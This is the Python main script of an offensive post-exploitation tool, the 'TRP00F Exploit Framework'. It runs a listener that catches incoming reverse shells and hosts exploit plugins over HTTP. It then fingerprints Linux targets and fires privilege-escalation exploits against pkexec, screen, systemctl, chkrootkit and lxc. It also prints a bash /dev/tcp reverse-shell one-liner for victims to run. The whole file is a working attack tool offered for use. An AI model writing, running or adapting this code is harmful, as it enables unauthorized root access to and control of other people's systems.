#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝

import argparse
from pwn import *
import sys
sys.path.append('.')
from plugin.core import core
from plugin.lxc import lxc
from plugin.pkexec import pkexec
from plugin.base import base
from plugin.screen_450 import screen
from plugin.systemctl import systemctl
from plugin.chkrootkit import chkrootkit


logo = '''
   /$$                                              /$$$$$$
  | $$                                             /$$__  $$
 /$$$$$$    /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$ | $$  \__/
|_  $$_/   /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$| $$$$
  | $$    | $$  \__/| $$  \ $$| $$  \ $$| $$  \ $$| $$_/
  | $$ /$$| $$      | $$  | $$| $$  | $$| $$  | $$| $$
  |  $$$$/| $$      | $$$$$$$/|  $$$$$$/|  $$$$$$/| $$
   \___/  |__/      | $$____/  \______/  \______/ |__/
                    | $$
                    | $$
                    |__/
        Github==>https://github.com/MartinxMax
        @Мартин. trp00f
'''
import http.server
import socketserver
import threading


def start_http_server(directory, port):
    handler = http.server.SimpleHTTPRequestHandler
    handler.directory = directory
    with socketserver.TCPServer(("", port), handler) as httpd:
        print(f"[*] Serving HTTP on port {port} from {directory}...")
        httpd.serve_forever()

class TRP00F:
    def __init__(self, local_ip, local_port, reverse_ip, reverse_port,http_port,password):
        self.local_ip = local_ip
        self.local_port = local_port
        self.reverse_ip = reverse_ip
        self.reverse_port = reverse_port
        self.http_port = http_port
        self.password =password
        self.server = listen(self.local_port, bindaddr=self.local_ip)
        self.start_http_server_thread()


    def start(self):
        try:
            client = self.server.wait_for_connection()
            print(f"[+] Trying to escalate privileges on {client.rhost}, reverse shell to {self.reverse_ip}:{self.reverse_port}")
            self.interact_with_shell(client)
        except KeyboardInterrupt:
            print("[-] Server shutting down.")
        finally:
            self.server.close()

    def interact_with_shell(self, client):
        try:
            core.send_command(client, 'ver')
            response = core.recv_response(client)

            if 'Microsoft' in response:
                print("[+] Windows system detected.")
                self.win(client)
            else:
                core.send_command(client, 'uname -a')
                response = core.recv_response(client,10)
                if 'Linux' in response:
                    print("[+] Linux system detected.")
                else:
                    print("[-] Unable to identify the operating system.")
                self.lin(client)

        except Exception as e:
            print(f"Error occurred while handling the client: {e}")
        finally:
            client.close()

    def lin(self, sock):
        res = base(self.reverse_ip, self.reverse_port).check(sock,self.password)
        if res['pkexec']:
            if input(f"[!] Do you want to exploit the vulnerability in file 'pkexec' ? (y/n) >").strip().lower() == 'y':
                pkexec().exploit(sock, self.local_ip, self.http_port, self.reverse_ip, self.reverse_port)
        if res['screen']:
            if input(f"[!] Do you want to exploit the vulnerability in file 'screen' ? (y/n) >").strip().lower()  == 'y':
                screen().exploit(sock, self.local_ip, self.http_port, self.reverse_ip, self.reverse_port)
        if res['systemctl']:
            if input(f"[!] Do you want to exploit the vulnerability in file 'systemctl' ? (y/n) >").strip().lower()  == 'y':
                systemctl().exploit(sock, self.local_ip, self.http_port, self.reverse_ip, self.reverse_port)
        if res['chkrootkit']:
            if input(f"[!] Do you want to exploit the vulnerability in file 'chkrootkit' ? (y/n) >").strip().lower()  == 'y':
                chkrootkit().exploit(sock, self.local_ip, self.http_port, self.reverse_ip, self.reverse_port)
        lxc(sock, self.local_ip, self.http_port)

    def win(self, client):
        pass

    def start_http_server_thread(self):
        plugin_directory = './plugin' 
        http_thread = threading.Thread(target=start_http_server, args=(plugin_directory, self.http_port))
        http_thread.daemon = True
        http_thread.start()

if __name__ == '__main__':

    print(logo)
    parser = argparse.ArgumentParser(description='TRP00F Exploit Framework')
    parser.add_argument('--lhost', required=True, help='Local IP address to bind the server')
    parser.add_argument('--lport', type=int, default=9998, help='Local port to listen on')
    parser.add_argument('--rhost', required=True, help='IP address for reverse shell')
    parser.add_argument('--rport', type=int, required=True, help='Port for reverse shell')
    parser.add_argument('--http', type=int, default=9999, help='HTTP port')
    parser.add_argument('--password', default='', type=str, help='User password')

    args = parser.parse_args()

    payload = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'"
    print(f"[*] Payload: {payload}")
    server = TRP00F(args.lhost, args.lport, args.rhost, args.rport, args.http,args.password)
    server.start()
